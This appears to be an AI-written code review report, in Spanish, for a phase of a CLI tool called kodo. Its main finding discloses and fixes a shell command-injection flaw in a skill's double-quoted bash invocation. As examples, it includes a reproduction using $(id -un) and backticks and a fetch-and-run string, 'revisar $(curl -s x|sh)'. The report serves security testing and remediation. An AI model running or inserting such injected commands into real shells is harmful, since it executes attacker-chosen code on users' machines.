---
phase: 84-superficies-de-captura-skill-sync-conteo-ambient
reviewed: 2026-07-26T09:31:48Z
depth: standard
files_reviewed: 10
files_reviewed_list:
  - .claude/skills/kodo-capture/SKILL.md
  - src/cli.js
  - src/cli/dashboard/App.js
  - src/cli/dashboard/SessionTable.js
  - src/cli/dashboard/inbox-count.js
  - src/cli/skill-sync.js
  - src/skill/sync.js
  - test/dashboard-inbox-count.test.js
  - test/kodo-capture-skill.test.js
  - test/skill-sync.test.js
findings:
  critical: 0
  warning: 5
  info: 4
  total: 9
  resolved: 3
status: issues_found
resolution_commit: c91f4d2
---

# Phase 84: Code Review Report

**Reviewed:** 2026-07-26T09:31:48Z
**Depth:** standard
**Files Reviewed:** 10
**Status:** issues_found → **CR-01, WR-01 y WR-05 CERRADOS** (commit `c91f4d2`); 5 warnings + 4 info abiertos

## Resolución aplicada (2026-07-26, commit `c91f4d2`)

| Hallazgo | Estado | Qué se hizo |
|---|---|---|
| **CR-01** (BLOCKER) | ✅ **Cerrado** | Comillas simples en la invocación congelada + regla de escape `'\''` documentada en el cuerpo. Se añadió el carril de test que faltaba: **ejecutar la línea del markdown por `bash -c`**, que es lo que ocurre cuando el modelo la manda a la tool `Bash` — los dos carriles previos tokenizaban en JS y nunca veían un shell, por eso no mordían. El discriminante es la ruta del HOME sandbox, no una palabra centinela (una centinela aparece también en el texto **sin** expandir y no distingue los casos: primer intento, rojo por construcción). |
| **WR-01** (WARNING) | ✅ **Cerrado** | La resolución del path se movió DENTRO del `try` de `readOpenCaptureCount`, con test de un `homedirFn` que lanza y de un `kodoDir` no-string. |
| **WR-05** (WARNING) | ✅ **Cerrado** | Lo pedía literalmente: «el carril child-process no pasa por ningún shell». El test de ejecución por `bash -c` que cerró CR-01 **es** ese carril — misma corrección, dos hallazgos. Detectado por el verificador de fase, no por el fixer. |
| WR-02, WR-03, WR-04, WR-06, WR-07, IN-01..IN-04 | ⏳ Abiertos | Registrados abajo. WR-02 (exit 1 en checkouts sin `kodo-capture`) toca la semántica de agregación de **D-03**, que es una decisión LOCKED de `84-CONTEXT.md`: no se cambia sin decisión del mantenedor. |

**Mordida verificada en ambos sentidos:** revertir CR-01 a mano pone rojos 2 tests (`el texto va entre comillas SIMPLES` y `ejecutada POR SHELL, no expande`); revertir WR-01 pone rojo el suyo. Restaurados: 25/25 verde. Suite completa **2 581 → 2 586, 0 fail**.

## Summary

Se revisó el cambio de Phase 84 (`git diff d6297e8..HEAD`): tres superficies (SKILL.md de captura,
generalización multi-skill de `kodo skill sync`, conteo ambient en la cabecera del dashboard).
Las 46 pruebas de los tres ficheros de test pasan en verde; eso no es evidencia de corrección y
varios de los hallazgos de abajo están **reproducidos empíricamente** contra el binario real.

Lo que sí resiste el ataque:

- La duplicación deliberada de la gramática (`OPEN_LINE_RE` vs `LINE_RE`) es **hoy** exacta: 20 000
  líneas fuzzeadas contra `listCaptures` dan **0 divergencias**. La aserción de ausencia de ReDoS
  también se sostiene (200 KB de línea separador-densa: 0,11 ms; sin backtracking catastrófico).
- El colapso en 0 del conteo es real (la cabecera vuelve byte-idéntica) y `LiveIndicator` no se tocó.
- El gate de exit 2 y su literal de stderr siguen byte-exactos y siguen anclados solo a la skill de
  identidad.
- `src/skill/sync.js` recibió exactamente la edición anunciada (nombre del entrypoint), sin cambio de
  firma ni de contrato de retorno.

Lo que no resiste: la invocación congelada del `SKILL.md` es una **línea de shell con comillas
dobles**, y por tanto el texto del operador se expande por bash antes de llegar a `kodo` — con
ejecución de comandos arbitrarios pre-aprobada por el `allowed-tools`. Además, la generalización del
handler introduce una regresión de exit code observable y un contrato `--json` nuevo sin ninguna
prueba.

## Critical Issues

### CR-01: [BLOCKER] La invocación congelada del `SKILL.md` permite sustitución de comandos con el texto del operador

**File:** `.claude/skills/kodo-capture/SKILL.md:16` (regla asociada en `:23`)

**Issue:** El contrato congelado es una **línea de bash con comillas dobles**:

```bash
kodo capture --origin skill -- "<texto>"
```

Dentro de comillas dobles bash sigue expandiendo `$(...)`, `` `...` ``, `$VAR` y `\`. La regla 1 solo
instruye escapar **comillas** (`Si contiene comillas, escápalas`), y la regla 3 obliga al modelo a
pasar el texto **verbatim** — es decir, a NO sanear. La skill declara
`allowed-tools: Bash(kodo capture *)`, que es una pre-aprobación por prefijo: el comando construido
encaja con el patrón.

Consecuencias, ambas verificadas ejecutando el binario real con `HOME` sandbox:

```
$ bash -c 'node bin/kodo capture --origin skill -- "coste: $(id -un) y `hostname` — 100$"'
✓ Capturado 4u31tu
$ cat $HOME/.kodo/inbox.md
- [ ] 4u31tu · coste: alex y M3PRO-de-Alex.local — 100$ · kodo · 2026-07-26 · skill
```

1. **Seguridad:** cualquier idea que contenga `$(…)` o backticks ejecuta ese comando. El vector no es
   hipotético: el operador dicta el texto, y textos técnicos con `$(...)`/backticks son exactamente
   lo que se captura en un repo. Un texto pegado desde un chat/issue (`revisar $(curl -s x|sh)`)
   ejecuta antes de que kodo vea un solo byte.
2. **Corrección:** la regla 3 ("el texto se pasa verbatim") queda **violada por el propio contrato**
   para todo texto con `$`, `` ` `` o `\`. En el ejemplo, `$(id -un)` se guardó como `alex`.

Ningún test lo detecta (ver WR-05): el carril "child-process, commander real" ejecuta
`spawnSync(execPath, [KODO_BIN, ...argv])` **sin shell**, que es justo la capa donde vive el
artefacto bajo contrato.

**Fix:** cambiar la forma congelada a comillas simples (que sí desactivan toda expansión) y hacer
explícita la regla de escape. En el markdown:

```bash
kodo capture --origin skill -- '<texto>'
```

Regla 1 sustituta (literal sugerido):

> **El texto va entre comillas SIMPLES y como un solo argumento.** Las comillas simples desactivan
> toda expansión de bash (`$`, `` ` ``, `\`, `!`). Si el texto contiene una comilla simple,
> sustitúyela por `'\''` al construir la llamada. NUNCA uses comillas dobles: dentro de ellas
> `$(...)`, `` `...` `` y `$VAR` se ejecutan/expanden y el texto dejaría de guardarse verbatim.

Cambios acoplados obligatorios en `test/kodo-capture-skill.test.js`:

- `ARGV_CANONICO` no cambia (el tokenizador entrega el mismo argv), pero `tokenize` (línea 110)
  solo entiende `"` — hay que añadir la rama de `'`.
- Añadir un test que ejecute la línea **por shell** (`spawnSync('bash', ['-c', linea])` con `HOME`
  sandbox) sustituyendo el placeholder por `$(id -un)` y assertando que la captura guarda el literal
  `$(id -un)`, no su salida. Ese test es el único que muerde CR-01.

## Warnings

### WR-01: [WARNING] `readOpenCaptureCount` sí puede lanzar — la resolución del path está FUERA del `try`

**File:** `src/cli/dashboard/inbox-count.js:88-93`

**Issue:** El JSDoc promete *"Never-throws de cuerpo entero (D-20)"*, pero las líneas 89 y 92 se
ejecutan antes del `try`:

```js
const kodoDir = deps.kodoDir || join((deps.homedirFn || homedir)(), '.kodo');
try { ... } catch { return 0; }
```

`os.homedir()` **puede lanzar** (`uv_os_homedir` → SystemError) en un entorno sin `HOME` y sin
entrada en `passwd` — contenedores con `--user <uid>` arbitrario son el caso real. Y si `homedirFn`
devuelve algo que no sea string, `join()` lanza `TypeError`. Verificado:

```
$ node -e "... readOpenCaptureCount({ homedirFn: () => undefined })"
THROWS: TypeError The "path" argument must be of type string. Received undefined
THROWS 2: uv ENOENT homedir
```

Como `App.js:748` invoca este leaf **en el cuerpo del render**, un throw aquí tira el árbol ink y
rompe la invariante "el dashboard never-throws end to end". `src/cli/dashboard/tasks.js:39-41` (el
molde citado) arrastra el mismo defecto — precedente, no justificación.

**Fix:** mover la resolución dentro del `try` (una línea):

```js
export function readOpenCaptureCount(deps = {}) {
  try {
    const readFileFn = deps.readFileFn || ((p) => readFileSync(p, 'utf-8'));
    const kodoDir = deps.kodoDir || join((deps.homedirFn || homedir)(), '.kodo');
    const raw = readFileFn(join(kodoDir, 'inbox.md'));
    let n = 0;
    for (const line of raw.split('\n')) if (OPEN_LINE_RE.test(line)) n++;
    return n;
  } catch {
    return 0;
  }
}
```

Y añadir el caso al bloque de tests D-20: `readOpenCaptureCount({ homedirFn: () => { throw … } })`
debe devolver 0.

### WR-02: [WARNING] `kodo skill sync` ahora sale 1 en repos donde antes salía 0 (skill del registro ausente)

**File:** `src/cli/skill-sync.js:134-166` (agregación en `:152-155`, exit en `:197`)

**Issue:** El gate de exit 2 está anclado solo a `kodo-orchestrate` (correcto, D-02), pero el bucle
trata la **ausencia del directorio** de una skill del registro como un fallo: `syncSkill` devuelve
`{status:'error', error:'source skill not found'}` y la agregación lo convierte en `status:"error"`
+ exit 1. Reproducido contra el binario real con un repo que solo tiene `kodo-orchestrate`
(es decir: cualquier checkout/worktree anterior a esta fase, y cualquier repo de terceros que tenga
la skill de identidad copiada):

```
$ node bin/kodo skill sync
Error: filesystem error: [kodo-capture] source skill not found
kodo-orchestrate: ✓ Synced 1 file to …/.claude/skills/kodo-orchestrate
EXIT=1                                   # pre-84: EXIT=0
```

Dos problemas en uno:

1. **Regresión de exit code** para un estado que no es un error del operador ni del filesystem.
   Rompe cualquier script/CI que encadene `kodo skill sync && …`.
2. **Clasificación mentirosa:** "filesystem error" para un directorio que simplemente no existe en
   ese checkout. El `status` agregado dice `"error"` aunque la skill de identidad se sincronizara bien.

**Fix:** distinguir "no está en este repo" de "falló al copiar" — saltar la entrada ausente como
no-op explícito:

```js
for (const name of KODO_SKILLS) {
  const source = join(cwd, '.claude', 'skills', name);
  const dest = join(homedir(), '.claude', 'skills', name);
  if (!hasSkillEntry(source)) {
    // La skill no viene en ESTE checkout: no es un fallo de filesystem.
    perSkill.push({ name, result: { status: 'noop', files_changed: 0 }, dest });
    continue;
  }
  …
}
```

(Si se prefiere seguir reportándolo, hágase con un `status` propio — `'missing'` — que no contamine
el exit code ni el prefijo `Error: filesystem error:`.) Añadir el test de regresión: fixture con solo
`kodo-orchestrate` → exit 0.

### WR-03: [WARNING] El payload `--json` en fallo es un contrato NUEVO y no tiene ni un solo test

**File:** `src/cli/skill-sync.js:162-188`; cobertura en `test/skill-sync.test.js:611-624`

**Issue:** Pre-84, `if (result.status === 'error') { err(...); return 1; }` estaba **antes** de la
rama `--json`: en fallo, stdout quedaba **vacío**. Ahora se emite siempre el payload. Verificado:

```
$ node bin/kodo skill sync --json     # repo sin kodo-capture
{"status":"error","files_changed":0,"skills":[{…},{"name":"kodo-capture","status":"error","files_changed":0}]}
EXIT=1
```

Es un cambio de contrato para consumidores scriptables (antes: stdout vacío ⇒ fallo; ahora: JSON con
`status:"error"`), no está documentado en la cabecera del módulo y **no hay ningún test que lo fije**.
De las cuatro ramas condicionales del payload solo una está cubierta:

| Rama | Test |
|---|---|
| `status/files_changed/skills[]` en happy path | ✅ `D-06b --json` |
| `status:"error"` + `skills[].status:"error"` | ❌ ninguno |
| `payload.files_pruned` (suma sobre skills) | ❌ el test de `--prune` no usa `--json` |
| `payload.symlink_replaced` (any) | ❌ el test de symlink es modo human |

Para una fase cuya invariante declarada es "`--json` byte-determinista con orden de claves fijo", tres
de cuatro ramas sin cobertura es un agujero.

**Fix:** añadir tres tests byte-anclados en `test/skill-sync.test.js` (molde del `D-06b` existente),
uno por rama: `--json` con una skill en error, `--json --prune` con un foráneo sembrado, y `--json`
con symlink legacy. Y documentar en la cabecera del módulo que `--json` emite payload también en el
carril de error.

### WR-04: [WARNING] El test anti-drift es de FIXTURE, no de propiedad: la deriva escapa por cualquier forma de línea ausente del fixture

**File:** `src/cli/dashboard/inbox-count.js:56-57`; `test/dashboard-inbox-count.test.js:112-155`

**Issue:** D-18 es la única contrapartida de la duplicación deliberada de la gramática, y se ejerce
sobre exactamente dos fixtures (el adversarial de 12 líneas y el de volumen, uniforme). La igualdad
solo se verifica para las formas de línea presentes ahí. Contraejemplo concreto que quedaría **verde
mientras los dos lectores divergen en producción**: si `LINE_RE` (`store.js:127`) gana un tercer
estado —`(enrutada|descartada|pospuesta)`— una línea

```
- [ ] a3f9k2 · idea · kodo · 2026-07-25 · cli · pospuesta
```

es una captura abierta para el oráculo y **no casa** `OPEN_LINE_RE` (que congela
`(?:enrutada|descartada)`) → el leaf subcuenta. Lo mismo con ensanchar el charset del id
(`[0-9a-zA-Z]+`) o admitir indentación. Ninguna de esas formas está en los fixtures.

(Comprobado que **hoy** no hay divergencia: fuzz de 20 000 líneas aleatorias sobre el alfabeto de la
gramática → 0 mismatches. El riesgo es de mantenimiento, no actual.)

**Fix (elimina la causa, no el síntoma):** la justificación de D-17 solo prohíbe importar
`src/inbox/store.js` — no obliga a duplicar la gramática. Extraerla a un leaf sin dependencias:

```js
// src/inbox/line-grammar.js — CERO imports. Fuente única de la gramática de línea.
export const LINE_RE =
  /^- \[([ x])\] ([0-9a-z]+) · (.+) · ([^·]*) · (\d{4}-\d{2}-\d{2}) · ([^·]*?)(?: · (enrutada|descartada)(?: → (.*))?)?$/;
```

`store.js` y `inbox-count.js` lo importan; el leaf del dashboard filtra por `m[1] === ' '`. Color
isolation intacta (el módulo nuevo no importa nada) y la deriva pasa a ser imposible por
construcción. Si se decide mantener la duplicación, entonces el test debe volverse de **propiedad**:
un fuzz generativo sobre el alfabeto de la gramática (como el que se usó aquí) en vez de dos fixtures
fijos.

### WR-05: [WARNING] El carril "child-process, fidelidad total" del test de la skill no pasa por ningún shell

**File:** `test/kodo-capture-skill.test.js:200-207` (`runKodo`), usado en `:307-333` y `:335-351`

**Issue:** La cabecera del fichero afirma que hacen falta dos carriles porque *"la vía CHILD es el
commander real (fidelidad total)"*. Pero `runKodo` hace
`spawnSync(process.execPath, [KODO_BIN, ...argv])` — **sin `shell: true`** — y el argv se obtiene de
un tokenizador propio que retira las comillas. El artefacto bajo contrato, en cambio, es una **línea
de bash** que un modelo ejecutará vía la tool `Bash`. Es decir: el test congela el argv *post*-shell y
nunca ejercita el shell, que es la única capa donde la elección de comillas del `SKILL.md` tiene
efecto. Por eso CR-01 pasa desapercibido con la suite en verde, y por eso el test "mordida" del `--`
tampoco prueba lo que dice probar sobre el comando real.

**Fix:** añadir un tercer carril que ejecute la **cadena literal** del bloque cercado, con `HOME`
sandbox y el placeholder sustituido por un texto adversarial de shell:

```js
const linea = contenidoDelBloque().replace(PLACEHOLDER, '$(id -un) y `hostname`');
const r = spawnSync('bash', ['-c', linea], { env: { ...process.env, HOME: home, NO_COLOR: '1' }, encoding: 'utf-8', timeout: 10000 });
const captura = parseLine(readFileSync(join(home, '.kodo', 'inbox.md'), 'utf-8').trim());
assert.equal(captura.text, '$(id -un) y `hostname`', 'el shell no puede expandir el texto del operador');
```

Con la línea actual (comillas dobles) ese assert falla — que es exactamente lo que debe ocurrir.

### WR-06: [WARNING] El conteo se lee del filesystem en cada re-render, incluso en los modos donde se descarta

**File:** `src/cli/dashboard/App.js:748`

**Issue:** `const inboxOpen = inboxCountFn({});` está en el cuerpo del render, antes de cualquier
rama. `SessionTable` hace **early-return** en `overlay`, `config`/`config-edit`, `setup`,
`projects*` y `projects-modules*` (`SessionTable.js:870-912`), así que en todos esos modos el valor
se calcula y se tira. Como el editor de config y el de proyectos son *text-inputs controlados*, cada
pulsación de tecla dispara un re-render → un `readFileSync` **completo** del inbox por tecla. La
lectura además no está acotada: un `~/.kodo/inbox.md` grande se lee entero en memoria en cada frame
(y un fichero de tamaño patológico produce un fallo de asignación que el `catch` no puede recoger).

No es solo latencia: es I/O síncrona como efecto en el cuerpo de un componente React, en rutas donde
no aporta nada.

**Fix:** condicionar el cálculo al único modo que lo pinta:

```js
const inboxOpen = mode === 'list' || mode === 'filter' || mode === 'confirm' || mode === 'deriving'
  ? inboxCountFn({})
  : 0;
```

(o memoizarlo por tick de `usePoll` con `useRef`, si se prefiere no acoplar App al set de modos).

### WR-07: [WARNING] Los siete ficheros de test de dashboard preexistentes quedan leyendo el `~/.kodo/inbox.md` real

**File:** `test/dashboard-inbox-count.test.js:276-279` (la consecuencia está documentada, no mitigada)

**Issue:** El propio fichero nuevo lo admite: *"esos siete SÍ leen el inbox real del desarrollador"*.
Como `App` cae al default `readOpenCaptureCount` cuando no se inyecta `inboxCountFn`, cada frame de
`dashboard-table.test.js`, `dashboard-status-line.test.js`, etc. incorpora ` N sin enrutar` en la
cabecera si quien ejecuta la suite tiene capturas abiertas. Hoy no rompe nada **solo** porque todos
esos asserts son `assert.match` parciales (verificado: no hay ninguna comparación byte-exacta de
frame ni conteo de líneas en esos ficheros). Es una invariante que nadie vigila: el primer
`assert.equal(frame, …)` o cualquier assert de layout que alguien añada mañana pasará en la máquina
del autor y fallará en la de otro. Además el resultado de la suite depende del estado del `HOME` de
quien la corre, que es exactamente la disciplina que el resto del repo se toma en serio (83-01,
§Pitfall 8).

**Fix:** inyectar `inboxCountFn: () => 0` en el helper de props compartido de cada uno de esos
ficheros (cambio de una línea por fichero), igual que ya se hace con `fetchFn`/`readTasksFn`.
Alternativa más barata y global: un gate source-hygiene que asserte que todo test que renderiza `App`
pasa `inboxCountFn`.

## Info

### IN-01: El comentario de "lazy formatter" es falso

**File:** `src/cli/skill-sync.js:111-112`

**Issue:** *"Lazy: createFormatter solo si entramos al render TTY (no se invoca para --json)"* — la
línea siguiente lo invoca incondicionalmente: `const fmt = (deps.formatterFn || (…))();`. Preexistente,
pero el bloque se tocó en esta fase y el comentario ahora induce a error sobre una ruta (`--json`) que
la fase amplía.

**Fix:** o bien pasar el thunk y llamarlo dentro de la rama human, o corregir el comentario.

### IN-02: Las entradas de `skills[]` no llevan `error`, `files_pruned` ni `symlink_replaced`

**File:** `src/cli/skill-sync.js:178-187`

**Issue:** Un consumidor de `--json` ve qué skill falló pero no **por qué**, ni a cuál pertenece un
`files_pruned`/`symlink_replaced` agregado. Obliga a scrapear stderr — justo lo que `--json` existe
para evitar.

**Fix:** añadir los campos opcionales a cada entrada (crecimiento aditivo, mismo criterio de orden de
claves) y cubrirlos con los tests de WR-03.

### IN-03: `inboxCountFn` no está en el bloque `@param` de `App`

**File:** `src/cli/dashboard/App.js:508-511`

**Issue:** La prop se documenta con un comentario inline en el destructuring, no con
`@param {…} [props.inboxCountFn]`, mientras el resto de props inyectables sí lo tienen. Hay
precedente (`readTasksFn`, `dispatchProjectIdsFn`, `setup` tampoco lo tienen), así que es deriva
acumulada, no introducida — pero se aleja de la regla "JSDoc en cada export".

**Fix:** añadir la entrada `@param` (y, ya puestos, las tres pendientes).

### IN-04: Un `symlink_replaced` seguido de error se pierde por completo

**File:** `src/skill/sync.js:148-154` + `src/cli/skill-sync.js:192-195`

**Issue:** El `catch` de `syncSkill` devuelve `{status:'error', files_changed, error}` sin
`symlink_replaced`, y el handler hace `continue` sobre las skills en error antes de `renderHuman`. Si
el symlink legacy se reemplazó (`unlinkSync` ya ejecutado) y luego falla la copia, el operador no
recibe ningún aviso de que su symlink desapareció: solo ve "filesystem error". Preexistente; la fase
no lo empeora pero tampoco lo corrige.

**Fix:** propagar `symlink_replaced` desde el `catch` de `syncSkill` y emitir su línea de warning
aunque la skill haya terminado en error.

---

_Reviewed: 2026-07-26T09:31:48Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
